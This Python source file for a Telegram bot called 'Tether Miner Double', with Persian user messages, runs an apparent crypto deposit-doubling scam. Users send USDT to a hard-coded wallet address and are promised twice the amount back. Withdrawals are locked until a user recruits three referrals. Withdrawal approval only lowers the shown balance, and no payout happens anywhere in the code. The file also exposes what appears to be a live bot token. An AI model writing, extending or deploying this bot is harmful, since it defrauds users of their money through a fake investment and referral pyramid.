import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689

logging.basicConfig(level=logging.INFO)
user_data = {}
referrals = {}
balances = {}
ref_bonus = {}

DEPOSIT_AMOUNT, WITHDRAW_AMOUNT, WALLET_ADDRESS, DEPOSIT_PROOF, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)

def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data.setdefault(user.id, {"balance": 0.0, "referrals": []})
    keyboard = [
        [InlineKeyboardButton("Deposit", callback_data="deposit")],
        [InlineKeyboardButton("Withdrawal", callback_data="withdraw")],
        [InlineKeyboardButton("Balance", callback_data="balance")],
        [InlineKeyboardButton("Referral", callback_data="referral")],
        [InlineKeyboardButton("Support", callback_data="support")]
    ]
    await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=InlineKeyboardMarkup(keyboard))

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "deposit":
        await query.message.reply_text("چه مقدار دلار یا تتر می‌خواهید شارژ کنید؟\nحداقل واریز ۵ دلار می‌باشد.")
        return DEPOSIT_AMOUNT

    elif query.data == "withdraw":
        referral_count = len(user_data.get(user_id, {}).get("referrals", []))
        if referral_count < 3:
            await query.message.reply_text(
                f"برای برداشت موجودی خود باید حداقل ۳ زیرمجموعه داشته باشید.\nلینک دعوت شما:\n{get_referral_link(user_id)}"
            )
            return ConversationHandler.END
        await query.message.reply_text("چه مقدار می‌خواهید برداشت کنید؟")
        return WITHDRAW_AMOUNT

    elif query.data == "balance":
        balance = balances.get(user_id, 0.0)
        await query.message.reply_text(f"موجودی شما: {balance} دلار")
        return ConversationHandler.END

    elif query.data == "referral":
        ref_link = get_referral_link(user_id)
        ref_count = len(user_data.get(user_id, {}).get("referrals", []))
        bonus = ref_count * 1.5
        total_balance = balances.get(user_id, 0.0) + bonus
        balances[user_id] = total_balance
        await query.message.reply_text(
            f"لینک دعوت شما:\n{ref_link}\nتعداد زیرمجموعه: {ref_count}\nبه ازای هر زیرمجموعه ۱.۵ دلار دریافت می‌کنید.\nموجودی کل شما: {total_balance} دلار"
        )
        return ConversationHandler.END

    elif query.data == "support":
        await query.message.reply_text("پیغام خود را ارسال کنید:")
        return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
        if amount < 5:
            await update.message.reply_text("حداقل واریز ۵ دلار می‌باشد.")
            return ConversationHandler.END
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text(
            "لطفاً مبلغ را به آدرس زیر واریز کرده و لینک تراکنش یا اسکرین‌شات ارسال کنید:\n"
            "آدرس کیف پول (BEP20): 0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB"
        )
        return DEPOSIT_PROOF
    except ValueError:
        await update.message.reply_text("لطفاً یک عدد معتبر وارد کنید.")
        return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    amount = context.user_data.get("deposit_amount", 0)
    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
    keyboard = [
        [InlineKeyboardButton("تایید", callback_data=f"confirm_deposit_{user_id}_{amount}")],
        [InlineKeyboardButton("رد", callback_data=f"reject_deposit_{user_id}")]
    ]
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"درخواست واریز:\nکاربر: {user_id}\nمقدار: {amount}\nمدرک:\n{proof}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("درخواست شما در حال بررسی است.")
    return ConversationHandler.END

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    _, _, user_id, amount = query.data.split("_")
    user_id = int(user_id)
    amount = float(amount)
    balances[user_id] = balances.get(user_id, 0.0) + (amount * 2)
    await context.bot.send_message(chat_id=user_id, text=f"تراکنش شما تایید شد. موجودی شما: {balances[user_id]} دلار")
    await query.message.delete()

async def reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    _, _, user_id = query.data.split("_")
    user_id = int(user_id)
    await context.bot.send_message(chat_id=user_id, text="تراکنش شما رد شد.")
    await query.message.delete()

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_id = update.effective_user.id
        if amount > balances.get(user_id, 0.0):
            await update.message.reply_text("مقدار درخواستی بیشتر از موجودی شما می‌باشد.")
            return ConversationHandler.END
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("لطفاً آدرس کیف پول تتر شبکه BEP20 خود را وارد کنید:")
        return WALLET_ADDRESS
    except ValueError:
        await update.message.reply_text("لطفاً عدد معتبری وارد کنید.")
        return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    address = update.message.text
    amount = context.user_data["withdraw_amount"]
    keyboard = [
        [InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw_{user_id}_{amount}_{address}")],
        [InlineKeyboardButton("رد", callback_data=f"reject_withdraw_{user_id}")]
    ]
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"درخواست برداشت:\nکاربر: {user_id}\nمقدار: {amount}\nآدرس: {address}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("درخواست شما برای بررسی ارسال شد.")
    return ConversationHandler.END

async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    _, _, user_id, amount, _ = query.data.split("_", 4)
    user_id = int(user_id)
    amount = float(amount)
    balances[user_id] -= amount
    await context.bot.send_message(chat_id=user_id, text="درخواست شما تایید شد و بزودی مبلغ واریز خواهد شد.")
    await query.message.delete()

async def reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    _, _, user_id = query.data.split("_")
    user_id = int(user_id)
    await context.bot.send_message(chat_id=user_id, text="درخواست برداشت شما رد شد. جهت اطلاعات بیشتر با ادمین تماس بگیرید.")
    await query.message.delete()

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = update.message.text
    keyboard = [
        [InlineKeyboardButton("پاسخ", callback_data=f"reply_support_{user_id}")]
    ]
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"پیام از کاربر {user_id}:\n{msg}", reply_markup=InlineKeyboardMarkup(keyboard))
    await update.message.reply_text("پیام شما به ادمین ارسال شد.")
    return ConversationHandler.END

async def reply_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    context.user_data["reply_to_user"] = int(query.data.split("_")[-1])
    await query.message.reply_text("متن پاسخ را وارد کنید:")
    return ADMIN_REPLY

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_text = update.message.text
    reply_to = context.user_data.get("reply_to_user")
    if reply_to:
        await context.bot.send_message(chat_id=reply_to, text=f"پاسخ ادمین:\n{reply_text}")
        await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

async def handle_referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        referrer_id = int(context.args[0])
        new_user_id = update.effective_user.id
        if new_user_id != referrer_id:
            user_data.setdefault(referrer_id, {"referrals": []})
            if new_user_id not in user_data[referrer_id]["referrals"]:
                user_data[referrer_id]["referrals"].append(new_user_id)

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("start", handle_referrals))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(confirm_deposit, pattern=r"^confirm_deposit_"))
    app.add_handler(CallbackQueryHandler(reject_deposit, pattern=r"^reject_deposit_"))
    app.add_handler(CallbackQueryHandler(confirm_withdraw, pattern=r"^confirm_withdraw_"))
    app.add_handler(CallbackQueryHandler(reject_withdraw, pattern=r"^reject_withdraw_"))
    app.add_handler(CallbackQueryHandler(reply_support, pattern=r"^reply_support_"))

    app.run_polling()

if __name__ == "__main__":
    main()
